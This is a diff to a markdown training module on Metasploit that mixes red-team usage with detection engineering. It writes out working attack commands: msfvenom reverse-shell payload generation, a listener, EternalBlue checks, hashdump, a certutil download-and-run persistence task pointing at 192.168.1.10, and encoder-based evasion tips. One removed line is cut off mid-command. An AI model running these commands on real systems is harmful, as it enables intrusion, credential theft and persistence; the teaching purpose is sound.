@@ -189,14 +189,6 @@ Mastering Metasploit’s core commands accelerates exploit execution, payload ge
 - [Offensive Security Metasploit Unleashed: Advanced Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
 - [MITRE ATT&CK: T1021.002 & T1059.003](https://attack.mitre.org/techniques/T1021/002/)
 
-### Threat Hunting & Detection Engineering
-To enhance threat hunting and detection engineering capabilities, focus on identifying techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - "User Execution" and [T1218](https://attack.mitre.org/techniques/T1218) - "Signed Binary Proxy Execution". Monitor Windows Event ID 4688 for command line executions, analyzing the `CommandLine` field for suspicious activity. Additionally, inspect Zeek logs for unusual DNS queries, particularly those with low TTL values or suspicious domain names. Threat hunters can pivot on these findings by investigating related network connections, process creations, or registry modifications. For instance, a suspicious command line execution can lead to examining the corresponding process ID in Windows Event ID 4688, and then searching for network connections related to that process in Zeek logs. By integrating these detection logic and threat hunting pivots, security teams can improve their ability to detect and respond to advanced threats. For more information on threat hunting and detection engineering, visit [https://www.cisecurity.org/](https://www.cisecurity.org/) or [https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf).
-
-
-### Essential Commands & Features
-
-Once a vulnerable service is identified (e.g., via Nmap), Metasploit streamlines exploit execution and post-exploitation. Below are **critical but undemonstrated** commands and features, with runnable examples and tactical use cases:
-
 #### **Exploit Execution**
 - **`exploit -j`**: Run the exploit as a background job (e.g., for multi-target attacks). Use when targeting multiple hosts or avoiding console locks.
   ```bash
@@ -235,6 +227,17 @@ Once a vulnerable service is identified (e.g., via Nmap), Metasploit streamlines
 - [Metasploit Unleashed: Exploit Commands](https://www.offensive-security.com/metasploit-unleashed/exploits/)
 - [Nmap Scripting Engine (NSE) Guide](https://nmap.org/book/nse.html)
 
+#### **Payload Generation**
+- **`msfvenom` (CLI)**: Generate standalone payloads for social engineering or lateral movement. Use `-f` to specify format (e.g., `exe`, `dll`).
+  ```bash
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe
+  ```
+  *Maps to [T1059.005: Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/) when paired with Office macros.*
+
+### Threat Hunting & Detection Engineering
+To enhance threat hunting and detection engineering capabilities, focus on identifying techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - "User Execution" and [T1218](https://attack.mitre.org/techniques/T1218) - "Signed Binary Proxy Execution". Monitor Windows Event ID 4688 for command line executions, analyzing the `CommandLine` field for suspicious activity. Additionally, inspect Zeek logs for unusual DNS queries, particularly those with low TTL values or suspicious domain names. Threat hunters can pivot on these findings by investigating related network connections, process creations, or registry modifications. For instance, a suspicious command line execution can lead to examining the corresponding process ID in Windows Event ID 4688, and then searching for network connections related to that process in Zeek logs. By integrating these detection logic and threat hunting pivots, security teams can improve their ability to detect and respond to advanced threats. For more information on threat hunting and detection engineering, visit [https://www.cisecurity.org/](https://www.cisecurity.org/) or [https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf).
+
+
 ### Adversary Emulation & Red-Team Perspective
 
 From a red-team perspective, Metasploit’s workflow is a powerful tool for adversary emulation, enabling testers to replicate real-world attack chains. Attackers leverage Metasploit to **establish persistence** (e.g., via **T1543.003: Create or Modify System Process: Windows Service**) by deploying payloads as services or scheduled tasks, ensuring long-term access even after reboots. For lateral movement, adversaries may abuse **T1563.002: Remote Service Session Hijacking: RDP Hijacking**, using Metasploit’s `post/windows/manage/enable_rdp` module to enable Remote Desktop and hijack active sessions via tools like `tscon.exe`, leaving minimal forensic traces beyond Event ID 4624 (logon events) and registry modifications under `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`.
@@ -245,43 +248,6 @@ Evasion is critical: attackers obfuscate payloads using **T1027.010: Indicator R
 - [MITRE ATT&CK: T1543.003](https://attack.mitre.org/techniques/T1543/003/)
 - [CISA: Red Teaming with Metasploit (PDF)](https://www.cisa.gov/sites/default/files/publications/Red_Team_Guide_508.pdf)
 
-
-### Essential Commands & Features
-
-Mastering Metasploit’s core workflow requires proficiency with its most powerful commands and features. Below are **runnable examples** of critical, undemonstrated capabilities for exploit execution, payload generation, and post-exploitation.
-
-#### **Exploit Execution**
-- **`exploit -j`**: Run an exploit as a background job (e.g., for multi-target attacks). Use when targeting multiple systems or avoiding session timeouts.
-  ```bash
-  msf6 > use exploit/multi/handler
-  msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
-  msf6 exploit(handler) > set LHOST 192.168.1.100
-  msf6 exploit(handler) > exploit -j
-  ```
-  *Maps to [T1210: Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/).*
-
-- **`check`**: Validate exploitability *without* executing. Critical for testing vulnerable services (e.g., EternalBlue).
-  ```bash
-  msf6 > use exploit/windows/smb/ms17_010_eternalblue
-  msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
-  msf6 exploit(ms17_010_eternalblue) > check
-  ```
-
-#### **Payload Generation**
-- **`msfvenom` (CLI)**: Generate standalone payloads for social engineering or lateral movement. Use `-f` to specify format (e.g., `exe`, `dll`).
-  ```bash
-  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe
-  ```
-  *Maps to [T1059.005: Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/) when paired with Office macros.*
-
-#### **Post-Exploitation**
-- **`post/multi/manage/shell_to_meterpreter`**: Upgrade a basic shell to Meterpreter for advanced post-exploitation (e.g., privilege escalation).
-  ```bash
-  msf6 > use post/multi/manage/shell_to_meterpreter
-  msf6 post(shell_to_meterpreter) > set SESSION 1
-  msf6 post(shell_to_meterpreter) > run
-  ```
-- **`run persistence -X -i 5 -p 4444 -r 19
 
 ### Detection Signatures & Reference Artifacts
 
@@ -369,29 +335,6 @@ rule Msfpayloads_msf {
 | sample sha256 | `0fd22b53ee70b0ebf7cdec9dcd506807a4901456c8f50acb9ad1c8e12019ffca` |
 | reproduce sample | a text file containing exactly: 'cyberlab benign training sample -- module 26-metasploit-workflow -- for detection-rule testing only
 ' |
-### Essential Commands & Features
-
-Beyond basic scanning and module loading, effective Metasploit workflow requires mastering exploit execution, payload switching, and post-exploitation modules. Use `exploit` (or `exploit -j` to launch as a background job) to execute an exploit; `check` probes whether a target is vulnerable without exploitation. When setting a payload, `set payload windows/x64/meterpreter/reverse_tcp` is common. To switch payloads mid-session, `sessions -u <ID>` upgrades a shell to Meterpreter.
-
-Post-exploitation modules extend control. For credential dumping, use `post/windows/gather/hashdump` (MITRE ATT&CK [T1003.001] – OS Credential Dumping: LSASS Memory). Example:  
-`use post/windows/gather/hashdump`  
-`set session 1`  
-`run`  
-
-To persist via scheduled tasks, `post/windows/manage/scheduleme` creates a task that reconnects a payload. Example:  
-`use post/windows/manage/scheduleme`  
-`set session 1`  
-`set CMD "cmd.exe /c certutil -urlcache -f http://192.168.1.10/payload.exe %TEMP%\upd.exe & %TEMP%\upd.exe"`  
-`run`  
-
-This maps to MITRE ATT&CK [T1053.005] (Scheduled Task/Job: Scheduled Task). Another key command is `background` to push a Meterpreter session into the background, then `sessions -i` to interact.
-
-These capabilities move the operator from basic scanning to full lifecycle operations, directly aligning with offensive workflows.
-
-**Sources:**  
-- Rapid7 Metasploit Post-Exploitation Guide: https://blog.rapid7.com/2012/01/27/metasploit-post-exploitation/  
-- SANS Metasploit Cheat Sheet: https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
-
 ### Common Pitfalls & Result Validation
 
 When using Metasploit, analysts often fall into traps that lead to false positives or missed detections. A frequent mistake is **over-relying on default payloads** (e.g., `windows/meterpreter/reverse_tcp`), which may trigger signature-based defenses. Instead, customize payloads using encoders (e.g., `shikata_ga_nai`) or obfuscation techniques to evade detection. Another pitfall is **ignoring session stability**: Meterpreter sessions can die silently if the target process crashes or network conditions change. Validate session persistence by migrating to a stable process (e.g., `migrate -N explorer.exe`) and monitoring for reconnection attempts.
